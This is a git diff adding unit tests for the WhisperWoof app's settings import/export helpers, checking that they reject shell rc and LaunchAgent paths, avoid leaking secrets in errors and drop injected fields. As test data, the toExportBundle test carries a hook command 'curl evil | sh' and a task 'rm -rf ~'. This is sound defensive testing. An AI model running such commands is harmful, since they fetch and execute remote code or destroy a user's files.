@@ -15,6 +15,10 @@ import {
   stripApiKeys,
   validateBundle,
   mergeArrays,
+  isJsonFilePath,
+  exportFileName,
+  parseImportFile,
+  toExportBundle,
 } from "../../bridge/settings-export-pure";
 
 interface ExportBundle {
@@ -191,5 +195,87 @@ describe("mergeArrays", () => {
 describe("EXPORT_VERSION", () => {
   it("is currently version 1", () => {
     expect(EXPORT_VERSION).toBe(1);
+  });
+});
+
+describe("isJsonFilePath", () => {
+  it("accepts .json files, any case", () => {
+    expect(isJsonFilePath("/Users/me/Documents/whisperwoof-settings.json")).toBe(true);
+    expect(isJsonFilePath("/Users/me/Backup.JSON")).toBe(true);
+  });
+
+  it("rejects shell rc files and other non-JSON targets", () => {
+    expect(isJsonFilePath("/Users/me/.zshrc")).toBe(false);
+    expect(isJsonFilePath("/Users/me/Library/LaunchAgents/evil.plist")).toBe(false);
+    expect(isJsonFilePath("/Users/me/run.json.sh")).toBe(false);
+  });
+
+  it("rejects a dotfile literally named .json", () => {
+    expect(isJsonFilePath("/Users/me/.json")).toBe(false);
+  });
+
+  it("rejects empty and non-string input", () => {
+    expect(isJsonFilePath("")).toBe(false);
+    expect(isJsonFilePath(undefined)).toBe(false);
+    expect(isJsonFilePath(42)).toBe(false);
+  });
+});
+
+describe("exportFileName", () => {
+  it("names the file after the local date", () => {
+    expect(exportFileName(new Date(2026, 8, 5))).toBe("whisperwoof-settings-2026-09-05.json");
+  });
+});
+
+describe("parseImportFile", () => {
+  it("returns the parsed bundle", () => {
+    const bundle = { appName: "WhisperWoof", data: {} };
+    expect(parseImportFile(JSON.stringify(bundle))).toEqual({ success: true, bundle });
+  });
+
+  it("does not echo file content in the error", () => {
+    const result = parseImportFile("export OPENAI_KEY=sk-live-123");
+    expect(result).toEqual({ success: false, error: "Invalid JSON" });
+  });
+
+  it("refuses valid JSON that isn't a WhisperWoof export, without returning it", () => {
+    const dockerConfig = JSON.stringify({ auths: { "ghcr.io": { auth: "c2VjcmV0" } } });
+    const result = parseImportFile(dockerConfig);
+    expect(result.success).toBe(false);
+    expect(result).not.toHaveProperty("bundle");
+    expect(JSON.stringify(result)).not.toContain("c2VjcmV0");
+  });
+});
+
+describe("toExportBundle", () => {
+  it("keeps only the export's own fields, so a file can't gain keys like `hooks`", () => {
+    const bundle = {
+      version: 1,
+      exportedAt: "2026-09-25T00:00:00.000Z",
+      appName: "WhisperWoof",
+      hooks: { SessionStart: [{ command: "curl evil | sh" }] },
+      data: { vocabulary: [{ word: "Mando" }], tasks: ["rm -rf ~"] },
+    };
+    expect(toExportBundle(bundle)).toEqual({
+      version: EXPORT_VERSION,
+      exportedAt: "2026-09-25T00:00:00.000Z",
+      appName: "WhisperWoof",
+      data: { vocabulary: [{ word: "Mando" }] },
+    });
+  });
+
+  it("strips API keys from preferences again at save time", () => {
+    const bundle = {
+      appName: "WhisperWoof",
+      data: { preferences: { openaiApiKey: "sk-live-123", uiLanguage: "en" } },
+    };
+    expect(toExportBundle(bundle).data).toEqual({ preferences: { uiLanguage: "en" } });
+  });
+
+  it("does not mutate the input", () => {
+    const bundle = { appName: "WhisperWoof", extra: true, data: { preferences: { apiKey: "x" } } };
+    const snapshot = JSON.parse(JSON.stringify(bundle));
+    toExportBundle(bundle);
+    expect(bundle).toEqual(snapshot);
   });
 });
